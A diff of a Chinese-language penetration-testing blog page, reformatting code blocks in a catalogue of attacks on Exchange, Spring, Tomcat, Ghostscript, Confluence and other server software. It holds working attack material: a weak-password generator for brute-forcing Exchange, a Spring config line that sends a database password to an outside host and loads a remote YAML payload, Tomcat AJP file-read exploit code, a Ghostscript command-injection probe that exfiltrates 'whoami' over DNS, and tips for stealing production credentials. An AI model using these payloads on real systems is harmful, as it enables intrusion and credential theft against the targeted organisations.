+<span class="hljs-selector-tag">outlook</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span></code></pre>
 
 <p>还有个很好用的域名, 这是outlook的自动发现域名</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autodiscover.domain.com</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs css"><span class="hljs-selector-tag">autodiscover</span><span class="hljs-selector-class">.domain</span><span class="hljs-selector-class">.com</span></code></pre>
 
 <p>2.爆破Exchange</p>
 <p>这里两个漏洞都需要登录, 其实这个的弱口令不是很难找, 经常会成为企业的突破口</p>
@@ -703,7 +1091,18 @@
 <p>3.爆破工具可使用 <code>owa</code>用<code>burp</code>, <code>ews</code>用<code>ruler</code>, <code>awvs</code>(比较好用)</p>
 <p>sensepost/ruler: A tool to abuse Exchange services<br><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">https://github.com/sensepost/ruler</a></p>
 <p>4.弱口令爆破技巧, 爆破<code>Exchange</code>相对比较好用, 直接生成企业特色弱口令</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import itertools</span><br><span class="line">prefix = ['baidu', 'Baidu']</span><br><span class="line">for x in [''.join(x) for x in list(itertools.product(prefix, ['@', ''], ['2019', '2020', '2018', '123', '1234', '123456'], ['!', '', '.']))] : print(x)</span><br><span class="line"></span><br><span class="line">baidu@2019!</span><br><span class="line">baidu@2019</span><br><span class="line">baidu@2019.</span><br><span class="line">baidu@2020!</span><br><span class="line">baidu@2020</span><br><span class="line">.........</span><br><span class="line">Baidu123456</span><br><span class="line">Baidu123456.</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs routeros">import itertools
+prefix = [<span class="hljs-string">'baidu'</span>, <span class="hljs-string">'Baidu'</span>]
+<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> [<span class="hljs-string">''</span>.join(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list(itertools.product(prefix, [<span class="hljs-string">'@'</span>, <span class="hljs-string">''</span>], [<span class="hljs-string">'2019'</span>, <span class="hljs-string">'2020'</span>, <span class="hljs-string">'2018'</span>, <span class="hljs-string">'123'</span>, <span class="hljs-string">'1234'</span>, <span class="hljs-string">'123456'</span>], [<span class="hljs-string">'!'</span>, <span class="hljs-string">''</span>, <span class="hljs-string">'.'</span>]))] : <span class="hljs-builtin-name">print</span>(x)
+
+baidu@2019!
+baidu@2019
+baidu@2019.
+baidu@2020!
+baidu@2020
+<span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span><span class="hljs-built_in">..</span>.
+Baidu123456
+Baidu123456.</code></pre>
 
 <p><strong>8. 防护方法</strong></p>
 <p>1.及时更新补丁</p>
@@ -713,10 +1112,10 @@
 <p>Coremail 是国内使用量很大的邮件服务商, 包括网易邮箱的后端使用的也是coremail</p>
 <p><strong>2. 影响组件</strong><br>Coremail</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Coremail</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Coremail</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Coremail"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Coremail"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong><br>Coremail-0day敏感文件泄露漏洞送附批量检测脚本_数据库_god_Zeo的博客-CSDN博客<br><a href="https://blog.csdn.net/god_zzZ/article/details/92735189" target="_blank" rel="noopener">https://blog.csdn.net/god_zzZ/article/details/92735189</a></p>
 <p><strong>6. 漏洞利用</strong></p>
@@ -733,10 +1132,10 @@
 <p>Winmail 是国内使用量较大的邮件服务商, 由于版本老旧, 有一些历史漏洞, 注入, 任意文件下载, 上传</p>
 <p><strong>2. 影响组件</strong><br>Winmail</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Winmail</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Winmail</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Winmail-Server"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Winmail-Server"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Winmail最新直达webshell 0day漏洞挖掘实录_91Ri.org<br><a href="http://www.91ri.org/16519.html" target="_blank" rel="noopener">http://www.91ri.org/16519.html</a></p>
@@ -758,10 +1157,10 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Zabbix</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zabbix</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Zabbix</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Zabbix"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Zabbix"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>记一次zabbix安装及漏洞利用getshell全过程 – 先知社区<br><a href="https://xz.aliyun.com/t/6874" target="_blank" rel="noopener">https://xz.aliyun.com/t/6874</a></p>
@@ -801,10 +1200,11 @@
 <p>Thinkphp 是国内很常见的PHP框架, 存在 远程代码执行/sql注入/反序列化/日志文件泄露等问题</p>
 <p><strong>2. 影响组件</strong><br>Thinkphp</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Thinkphp</span><br><span class="line">X-Powered-By: ThinkPHP</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs sas">Thinkphp
+<span class="hljs-meta">X</span>-Powered-<span class="hljs-meta">By</span>: ThinkPHP</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="ThinkPHP"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"ThinkPHP"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>ThinkPHP漏洞总结 – 赛克社区<br><a href="http://zone.secevery.com/article/1165" target="_blank" rel="noopener">http://zone.secevery.com/article/1165</a></p>
@@ -828,10 +1228,10 @@
 <p>Spring 是java web里最最最最常见的组件了, 自然也是研究的热门, 好用的漏洞主要是Spring Boot Actuators 反序列化, 火起来之前用了一两年, 效果很棒</p>
 <p><strong>2. 影响组件</strong><br>Spring xxx</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Application-Context:</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs coq">X-Application-<span class="hljs-keyword">Context</span>:</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Spring-Framework"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Spring-Framework"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Spring 框架漏洞集合 ~ Misaki’s Blog<br><a href="https://misakikata.github.io/2020/04/Spring-框架漏洞集合/" target="_blank" rel="noopener">https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E%E9%9B%86%E5%90%88/</a></p>
@@ -848,12 +1248,63 @@
 <p><code>/env</code> 可以偷session, RCE</p>
 <p><code>/heapdump</code> 可以直接dump jvm中的对象, 使用 jhat 可以读取里面的对象</p>
 <p>可以遍历如下的endpoint, 1.x 2.x的目录不一样, 所以都覆盖了一下</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">/trace</span><br><span class="line">/health</span><br><span class="line">/loggers</span><br><span class="line">/metrics</span><br><span class="line">/autoconfig</span><br><span class="line">/heapdump</span><br><span class="line">/threaddump</span><br><span class="line">/env</span><br><span class="line">/info</span><br><span class="line">/dump</span><br><span class="line">/configprops</span><br><span class="line">/mappings</span><br><span class="line">/auditevents</span><br><span class="line">/beans</span><br><span class="line">/jolokia</span><br><span class="line">/cloudfoundryapplication</span><br><span class="line">/hystrix.stream</span><br><span class="line">/actuator</span><br><span class="line">/actuator/auditevents</span><br><span class="line">/actuator/beans</span><br><span class="line">/actuator/health</span><br><span class="line">/actuator/conditions</span><br><span class="line">/actuator/configprops</span><br><span class="line">/actuator/env</span><br><span class="line">/actuator/info</span><br><span class="line">/actuator/loggers</span><br><span class="line">/actuator/heapdump</span><br><span class="line">/actuator/threaddump</span><br><span class="line">/actuator/metrics</span><br><span class="line">/actuator/scheduledtasks</span><br><span class="line">/actuator/httptrace</span><br><span class="line">/actuator/mappings</span><br><span class="line">/actuator/jolokia</span><br><span class="line">/actuator/hystrix.stream</span><br><span class="line">/monitor</span><br><span class="line">/monitor/auditevents</span><br><span class="line">/monitor/beans</span><br><span class="line">/monitor/health</span><br><span class="line">/monitor/conditions</span><br><span class="line">/monitor/configprops</span><br><span class="line">/monitor/env</span><br><span class="line">/monitor/info</span><br><span class="line">/monitor/loggers</span><br><span class="line">/monitor/heapdump</span><br><span class="line">/monitor/threaddump</span><br><span class="line">/monitor/metrics</span><br><span class="line">/monitor/scheduledtasks</span><br><span class="line">/monitor/httptrace</span><br><span class="line">/monitor/mappings</span><br><span class="line">/monitor/jolokia</span><br><span class="line">/monitor/hystrix.stream</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs jboss-cli"><span class="hljs-string">/trace</span>
+<span class="hljs-string">/health</span>
+<span class="hljs-string">/loggers</span>
+<span class="hljs-string">/metrics</span>
+<span class="hljs-string">/autoconfig</span>
+<span class="hljs-string">/heapdump</span>
+<span class="hljs-string">/threaddump</span>
+<span class="hljs-string">/env</span>
+<span class="hljs-string">/info</span>
+<span class="hljs-string">/dump</span>
+<span class="hljs-string">/configprops</span>
+<span class="hljs-string">/mappings</span>
+<span class="hljs-string">/auditevents</span>
+<span class="hljs-string">/beans</span>
+<span class="hljs-string">/jolokia</span>
+<span class="hljs-string">/cloudfoundryapplication</span>
+<span class="hljs-string">/hystrix.stream</span>
+<span class="hljs-string">/actuator</span>
+<span class="hljs-string">/actuator/auditevents</span>
+<span class="hljs-string">/actuator/beans</span>
+<span class="hljs-string">/actuator/health</span>
+<span class="hljs-string">/actuator/conditions</span>
+<span class="hljs-string">/actuator/configprops</span>
+<span class="hljs-string">/actuator/env</span>
+<span class="hljs-string">/actuator/info</span>
+<span class="hljs-string">/actuator/loggers</span>
+<span class="hljs-string">/actuator/heapdump</span>
+<span class="hljs-string">/actuator/threaddump</span>
+<span class="hljs-string">/actuator/metrics</span>
+<span class="hljs-string">/actuator/scheduledtasks</span>
+<span class="hljs-string">/actuator/httptrace</span>
+<span class="hljs-string">/actuator/mappings</span>
+<span class="hljs-string">/actuator/jolokia</span>
+<span class="hljs-string">/actuator/hystrix.stream</span>
+<span class="hljs-string">/monitor</span>
+<span class="hljs-string">/monitor/auditevents</span>
+<span class="hljs-string">/monitor/beans</span>
+<span class="hljs-string">/monitor/health</span>
+<span class="hljs-string">/monitor/conditions</span>
+<span class="hljs-string">/monitor/configprops</span>
+<span class="hljs-string">/monitor/env</span>
+<span class="hljs-string">/monitor/info</span>
+<span class="hljs-string">/monitor/loggers</span>
+<span class="hljs-string">/monitor/heapdump</span>
+<span class="hljs-string">/monitor/threaddump</span>
+<span class="hljs-string">/monitor/metrics</span>
+<span class="hljs-string">/monitor/scheduledtasks</span>
+<span class="hljs-string">/monitor/httptrace</span>
+<span class="hljs-string">/monitor/mappings</span>
+<span class="hljs-string">/monitor/jolokia</span>
+<span class="hljs-string">/monitor/hystrix.stream</span></code></pre>
 
 <p>这里通过 <code>/env</code> + <code>/refresh</code> 进行rce应该还有其他利用手法, 当spring boot reload的时候会进行一些默认操作</p>
 <p>里面就有操作空间, 很像fastjson反序列化</p>
 <p>2.就算实在不能RCE, 这里也有个技巧可以偷取 Spring 配置文件中的加密字段, 偷一下生产环境的密码/key也ok</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eureka.client.serviceUrl.defaultZone=http://${somedb.password}@127.0.0.1:5000</span><br><span class="line">spring.cloud.bootstrap.location=http://${somedb.password}@artsploit.com/yaml-payload.yml</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs roboconf">eureka.client.serviceUrl.defaultZone=http://${<span class="hljs-attribute">somedb.password}@127.0.0.1</span>:5000
+spring<span class="hljs-variable">.cloud</span><span class="hljs-variable">.bootstrap</span><span class="hljs-variable">.location</span>=http://${somedb<span class="hljs-variable">.password</span>}@artsploit<span class="hljs-variable">.com</span>/yaml-payload<span class="hljs-variable">.yml</span></code></pre>
 
 <p>3.尤其是使用spring eureka做集群的时候, 通常拿到一台服务器, 就可以传递恶意注册到其他server, 从而感染整个微服务集群</p>
 <p>eureka 通常是 server 也是 client, 无论对方请求什么都直接返回恶意序列化xml就可以了</p>
@@ -866,10 +1317,10 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Phpstudy</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpStudy 探针</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs nginx"><span class="hljs-attribute">phpStudy</span> 探针</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="phpStudy 探针"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"phpStudy 探针"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>PhpStudy 后门分析<br><a href="https://paper.seebug.org/1044/" target="_blank" rel="noopener">https://paper.seebug.org/1044/</a></p>
@@ -886,7 +1337,10 @@
 <p>Struts 真的是Java漏洞史上浓墨重彩的一笔, 堪称那些年的漏洞之王, 一直到现在还没有消失, 企业内网还是有不少存在</p>
 <p><strong>2. 影响组件</strong><br>Struts</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Struts</span><br><span class="line">.action</span><br><span class="line">.do</span><br><span class="line">.action!xxxx</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs asciidoc">Struts
+<span class="hljs-title">.action</span>
+<span class="hljs-title">.do</span>
+<span class="hljs-title">.action!xxxx</span></code></pre>
 
 <p>struts2_check/struts2_hunt_v2.py at master · coffeehb/struts2_check<br><a href="https://github.com/coffeehb/struts2_check/" target="_blank" rel="noopener">https://github.com/coffeehb/struts2_check/</a></p>
 <p><strong>4. Fofa Dork</strong></p>
@@ -906,10 +1360,10 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Solr</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Solr</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Solr</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Solr"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Solr"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Apache Solr最新RCE漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/218730.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/218730.html</a></p>
@@ -932,10 +1386,13 @@
 <p>Apache Tomcat 8 &lt; 8.5.51</p>
 <p>Apache Tomcat 9 &lt; 9.0.31</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tomcat</span><br><span class="line">8009</span><br><span class="line">ajp</span><br><span class="line">\x04\x01\xf4\x00\x15</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs taggerscript">tomcat
+8009
+ajp
+<span class="hljs-symbol">\x</span>04<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>f4<span class="hljs-symbol">\x</span>00<span class="hljs-symbol">\x</span>15</code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol="ajp"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">protocol</span>=<span class="hljs-string">"ajp"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Apache Tomcat AJP协议文件包含漏洞分析 – 斗象能力中心<br><a href="https://blog.riskivy.com/apache-tomcat-ajp协议文件包含漏洞分析/" target="_blank" rel="noopener">https://blog.riskivy.com/apache-tomcat-ajp%e5%8d%8f%e8%ae%ae%e6%96%87%e4%bb%b6%e5%8c%85%e5%90%ab%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90/</a></p>
@@ -944,7 +1401,14 @@
 <p><strong>7. 利用技巧</strong></p>
 <p>1.当时还没公开poc的时候就分析出来exp挺有意思的, 效果确实还可以, 当天fofa都被累挂了</p>
 <p>主要代码也就这</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">t = Tomcat("127.0.0.1", 8009)</span><br><span class="line">_, data = t.perform_request('/', attributes=[</span><br><span class="line">    {'name': 'req_attribute', 'value': ['javax.servlet.include.request_uri', '/']}, </span><br><span class="line">    {'name': 'req_attribute', 'value': ['javax.servlet.include.path_info', "/WEB-INF/web.xml"]}, </span><br><span class="line">    {'name': 'req_attribute', 'value': ['javax.servlet.include.servlet_path', '/']}, </span><br><span class="line">])</span><br><span class="line">print('----------------------------')</span><br><span class="line">print("".join([bytes.decode(d.data) for d in data]))</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs stylus">t = Tomcat(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">8009</span>)
+_, data = t.perform_request(<span class="hljs-string">'/'</span>, attributes=[
+    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.request_uri'</span>, <span class="hljs-string">'/'</span>]}, 
+    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.path_info'</span>, <span class="hljs-string">"/WEB-INF/web.xml"</span>]}, 
+    {<span class="hljs-string">'name'</span>: <span class="hljs-string">'req_attribute'</span>, <span class="hljs-string">'value'</span>: [<span class="hljs-string">'javax.servlet.include.servlet_path'</span>, <span class="hljs-string">'/'</span>]}, 
+])
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">'----------------------------'</span>)</span></span>
+<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">""</span>.join([bytes.decode(d.data)</span></span> <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data]))</code></pre>
 
 <p>2.通过修改这里的路径可以进行Webapp切换, 默认是<code>ROOT/</code>, 需要切换应用就改成 <code>/admin/</code> 之类的</p>
 <p>3.通常检测的时候, 尽量保持<code>t.perform_request('/'</code> , 有的poc喜欢用 <code>/addsd</code> 这种的不存在的路径, 有些情况会读不到文件</p>
@@ -957,7 +1421,9 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Nginx + FPM + PHP7</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Nginx</span><br><span class="line">PHP</span><br><span class="line">nextcloud</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Nginx</span>
+<span class="hljs-attribute">PHP</span>
+<span class="hljs-attribute">nextcloud</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
 <p><strong>5. 漏洞分析</strong></p>
@@ -979,7 +1445,7 @@
 <p><strong>3. 漏洞指纹</strong></p>
 <p>Confluence</p>
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Confluence"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"Confluence"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>Confluence 未授权 RCE (CVE-2019-3396) 漏洞分析<br><a href="https://paper.seebug.org/884/" target="_blank" rel="noopener">https://paper.seebug.org/884/</a></p>
@@ -996,10 +1462,12 @@
 <p>这是一个从来没有人关注的默认开放的8091端口, 部分低版本支持<code>file协议</code>可以getshell, 适用于不出网的情况, 这个poc不是特别稳定, 因为日志中有不可控的字符</p>
 <p><code>velocity</code>比<code>php</code>语法要相对严格一点, 可能会报错, 而且<code>velocity</code>渲染的时候, 目标文件不能太大, 但是极端情况可以试一下</p>
 <p>POC写入日志,分析一下挺简单的</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /synchrony/heartbeat HTTP/1.1</span><br><span class="line">Host: localhost:8091</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/synchrony/heartbeat</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: localhost:8091</code></pre>
 
 <p>这里就使用file协议包含log文件就ok</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: localhost:8090</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs crystal">POST /rest/tinymce/<span class="hljs-number">1</span>/<span class="hljs-function"><span class="hljs-keyword">macro</span><span class="hljs-title">/</span></span>preview HTTP/<span class="hljs-number">1.1</span>
+<span class="hljs-symbol">Host:</span> <span class="hljs-symbol">localhost:</span><span class="hljs-number">8090</span></code></pre>
 
 <p><strong>8. 防护方法</strong></p>
 <p>1.升级到最新版</p>
@@ -1010,7 +1478,7 @@
 <p><strong>2. 影响组件</strong></p>
 <p>imagemagick, libmagick, graphicsmagick, gimp, python-matplotlib, texlive-core, texmacs, latex2html, latex2rtf 等图像处理应用</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.ps/.jpg/.png</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs asciidoc"><span class="hljs-title">.ps/.jpg/.png</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
 <p><strong>5. 漏洞分析</strong></p>
@@ -1022,7 +1490,7 @@
 <p>1.如果发现网站可以上传图片, 且图片没有经过裁剪, 最后返回缩略图, 这里就可能存在Ghostscript 上传图片代码执行</p>
 <p>dnslog 可以用 <code>ping</code>uname<code>.admin.ceye.io</code> 或 <code>ping</code>whoami<code>.admin.ceye.io</code></p>
 <p>保存成图片, 以后用起来方便, 有个版本的 centos 和 ubuntu poc还不一样, 可以这样构造</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping `whoami`.centos.admin.ceye.io` / `ping `whoami`.ubuntu.admin.ceye.io</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs autohotkey">ping `whoami`.centos.admin.ceye.io` / `ping `whoami`.ubuntu.admin.ceye.io</code></pre>
 
 <p>分别命名为 <code>centos_ps.jpg</code>/<code>ubuntu_ps.jpg</code>, 这样测试的时候直接传2个文件, 通过DNSLOG可以区分是哪个poc执行的</p>
 <p><strong>8. 防护方法</strong></p>
@@ -1032,10 +1500,10 @@
 <p><strong>2. 影响组件</strong></p>
 <p>Jboss</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jboss</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ebnf"><span class="hljs-attribute">Jboss</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="JBoss"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"JBoss"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
 <p>打开JBoss的潘多拉魔盒:JBoss高危漏洞分析 – FreeBuf互联网安全新媒体平台<br><a href="https://www.freebuf.com/vuls/186948.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/186948.html</a></p>
@@ -1055,10 +1523,11 @@
 <p><strong>2. 影响组件</strong></p>
 <p>WebSphere</p>
 <p><strong>3. 漏洞指纹</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WebSphere</span><br><span class="line">8880</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs angelscript">WebSphere
+<span class="hljs-number">8880</span></code></pre>
 
 <p><strong>4. Fofa Dork</strong></p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="IBM-WebSphere"</span><br></pre></td></tr></tbody></table></figure>
+<pre><code class="hljs ini"><span class="hljs-attr">app</span>=<span class="hljs-string">"IBM-WebSphere"</span></code></pre>
 
 <p><strong>5. 漏洞分析</strong></p>
